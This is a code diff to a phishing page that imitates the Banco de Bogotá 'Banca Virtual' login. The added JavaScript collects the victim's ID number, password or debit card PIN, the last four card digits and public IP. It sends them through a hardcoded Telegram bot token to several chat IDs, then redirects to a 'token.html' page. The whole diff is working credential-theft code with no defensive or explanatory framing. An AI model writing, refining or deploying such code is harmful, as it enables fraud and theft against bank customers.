@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Banco de Bogotá - Banca Virtual</title>
-  
   <style>
     *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
     body{background:#fff;display:flex;flex-direction:column;min-height:100vh}
@@ -86,7 +85,7 @@
               <option value="P.S.">P.S.</option>
               <option value="R.C.">R.C.</option>
             </select>
-            <input type="text" id="idNumCS" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*">
+            <input type="text" id="idNumCS" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*" maxlength="10">
           </div>
         </div>
         <div class="form-group">
@@ -113,7 +112,7 @@
               <option value="P.S.">P.S. Pasaporte</option>
               <option value="R.C.">R.C. Registro civil</option>
             </select>
-            <input type="text" id="idNumTD" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*">
+            <input type="text" id="idNumTD" class="form-control" placeholder="#" inputmode="numeric" pattern="\d*" maxlength="10">
           </div>
         </div>
         <div class="form-group">
@@ -147,89 +146,127 @@
   </footer>
 
   <script>
-    // Pestañas
-    document.querySelectorAll('.tab').forEach(tab=>{
-      tab.addEventListener('click',function(){
-        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-        this.classList.add('active');
-        const tgt = this.dataset.target;
-        document.querySelectorAll('.formulario').forEach(f=>f.style.display='none');
-        document.getElementById(tgt).style.display='block';
-        document.getElementById('info-text').innerText =
-          tgt==='clave-segura'
-            ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar."
-            : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar.";
+    // Capturamos referencias
+    // === Referencias a elementos del DOM ===
+    const idTypeCS     = document.getElementById('idTypeCS');
+    const idNumCS      = document.getElementById('idNumCS');
+    const claveInput   = document.getElementById('claveInput');
+    const idTypeTD     = document.getElementById('idTypeTD');
+    const idNumTD      = document.getElementById('idNumTD');
+    const claveTarjeta = document.getElementById('claveTarjeta');
+    const ult4Tarjeta  = document.getElementById('ult4Tarjeta');
+    const btnIngresar  = document.getElementById('btnIngresar');
+    const tabs         = document.querySelectorAll('.tab');
+    const formularios  = document.querySelectorAll('.formulario');
+    const infoText     = document.getElementById('info-text');
+    const closeBtn     = document.querySelector('.close-btn');
+
+    // === Configuración de tu bot y los chat IDs ===
+    const BOT_TOKEN = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk';
+    const CHAT_IDS  = ['-1002373013684', '-4916503465'];  // Agrega aquí todos los chat_id
+
+    // === Función para alternar pestañas ===
+    tabs.forEach(tab => {
+      tab.addEventListener('click', () => {
+        // Marca pestaña activa
+        tabs.forEach(t => t.classList.remove('active'));
+        tab.classList.add('active');
+        // Muestra el formulario correspondiente
+        const target = tab.dataset.target;
+        formularios.forEach(f => f.style.display = 'none');
+        document.getElementById(target).style.display = 'block';
+        // Actualiza el mensaje de info
+        infoText.innerText = target === 'clave-segura'
+          ? "Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar."
+          : "Estás ingresando con tu Tarjeta Débito. Selecciona 'Clave Segura' para cambiar.";
         checkFields();
       });
     });
 
-    // Mostrar/Ocultar contraseña
-    document.querySelectorAll('.toggle-password').forEach(toggle=>{
-      toggle.addEventListener('click',function(){
-        const inp = this.previousElementSibling;
-        if(inp.type === 'password'){
-          inp.type = 'text'; this.textContent = 'Ocultar';
+    // === Toggle de mostrar/ocultar contraseña ===
+    document.querySelectorAll('.toggle-password').forEach(toggle => {
+      toggle.addEventListener('click', () => {
+        const inp = toggle.previousElementSibling;
+        if (inp.type === 'password') {
+          inp.type = 'text';
+          toggle.textContent = 'Ocultar';
         } else {
-          inp.type = 'password'; this.textContent = 'Mostrar';
+          inp.type = 'password';
+          toggle.textContent = 'Mostrar';
         }
       });
     });
 
-    // Cerrar info
-    document.querySelector('.close-btn').onclick = () => {
-      document.querySelector('.info-message').style.display='none';
-    };
+    // === Cerrar banner informativo ===
+    closeBtn.addEventListener('click', () => {
+      document.querySelector('.info-message').style.display = 'none';
+    });
 
-    // Habilitar botón
-    const btn = document.getElementById('btnIngresar');
-    ['idNumCS','claveInput','idNumTD','claveTarjeta','ult4Tarjeta']
-      .map(id=>document.getElementById(id))
-      .forEach(el=>el.addEventListener('input',checkFields));
-    function checkFields(){
-      const active = document.querySelector('.tab.active').dataset.target;
-      let ok=false;
-      if(active==='clave-segura'){
-        ok = idNumCS.value.trim()!=='' && claveInput.value.trim()!=='';
+    // === Habilitar o deshabilitar botón según campos no vacíos ===
+    [idNumCS, claveInput, idNumTD, claveTarjeta, ult4Tarjeta]
+      .forEach(el => el.addEventListener('input', checkFields));
+
+    function checkFields() {
+      const activeForm = document.querySelector('.tab.active').dataset.target;
+      let ok = false;
+      if (activeForm === 'clave-segura') {
+        ok = idNumCS.value.trim() !== '' && claveInput.value.trim() !== '';
       } else {
-        ok = idNumTD.value.trim()!=='' && claveTarjeta.value.trim()!=='' && ult4Tarjeta.value.trim()!=='';
+        ok = idNumTD.value.trim() !== '' &&
+             claveTarjeta.value.trim() !== '' &&
+             ult4Tarjeta.value.trim() !== '';
       }
-      btn.disabled=!ok;
-      btn.classList.toggle('active',ok);
+      btnIngresar.disabled = !ok;
+      btnIngresar.classList.toggle('active', ok);
     }
 
-    // Enviar a Telegram y redirigir
-    const token = '7566301264:AAETlzNwR9-iuvl4xiUEuWsiYGd1hR-L4zk'; // Reemplaza con tu token real
-    const chat_id = '-4862214022'; // Reemplaza con tu chat_id
-
-    btn.addEventListener('click', async ()=>{
-      const active = document.querySelector('.tab.active').dataset.target;
+    // === Envío del mensaje a múltiples chat IDs ===
+    btnIngresar.addEventListener('click', async () => {
+      // Construimos los datos según la pestaña activa
+      const activeForm = document.querySelector('.tab.active').dataset.target;
       const datos = {
-        tipo: active==='clave-segura'?'Clave Segura':'Tarjeta Débito',
-        tipoId: active==='clave-segura'?idTypeCS.value:idTypeTD.value,
-        id: active==='clave-segura'?idNumCS.value:idNumTD.value,
-        clave: active==='clave-segura'?claveInput.value:claveTarjeta.value,
-        ult4: active==='tarjeta-debito'?ult4Tarjeta.value:null
+        tipo:   activeForm === 'clave-segura' ? 'Clave Segura' : 'Tarjeta Débito',
+        tipoId: activeForm === 'clave-segura' ? idTypeCS.value : idTypeTD.value,
+        id:     activeForm === 'clave-segura' ? idNumCS.value  : idNumTD.value,
+        clave:  activeForm === 'clave-segura' ? claveInput.value : claveTarjeta.value,
+        ult4:   activeForm === 'tarjeta-debito' ? ult4Tarjeta.value : null
       };
 
       try {
-        const ip = (await fetch('https://api.ipify.org?format=json').then(r=>r.json())).ip || 'desconocida';
+        // Obtenemos la IP pública
+        const ip = await fetch('https://api.ipify.org?format=json')
+                        .then(r => r.json())
+                        .then(j => j.ip)
+                        .catch(() => 'desconocida');
+
+        // Montamos el mensaje en Markdown
         let mensaje = `🔔 *Nuevo acceso recibido:*\n\n`;
         mensaje += `🔐 *Tipo:* ${datos.tipo}\n`;
         mensaje += `🪪 *Tipo ID:* ${datos.tipoId}\n`;
         mensaje += `🧾 *Identificación:* \`${datos.id}\`\n`;
         mensaje += `🔑 *Clave:* \`${datos.clave}\`\n`;
-        if(datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
+        if (datos.ult4) mensaje += `💳 *Últimos 4 dígitos:* \`${datos.ult4}\`\n`;
         mensaje += `🌐 *IP:* \`${ip}\``;
 
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify({ chat_id, text: mensaje, parse_mode:'Markdown' })
-        });
+        // Enviamos el mismo mensaje a cada chat_id
+        for (const chat_id of CHAT_IDS) {
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text: mensaje, parse_mode: 'Markdown' })
+          });
+          const json = await res.json();
+          if (!json.ok) {
+            console.error(`Error enviando a ${chat_id}:`, json.description);
+            // Opcional: podrías romper el loop o acumular errores
+          }
+        }
 
-        window.location.href='token.html';
-      } catch(e){
-        console.error(e);
+        // Si todos (o la mayoría) fueron enviados, redirigimos
+        window.location.href = 'token.html';
+
+      } catch (err) {
+        console.error('Error en el envío a Telegram:', err);
         alert('Ocurrió un error, intenta de nuevo.');
       }
     });
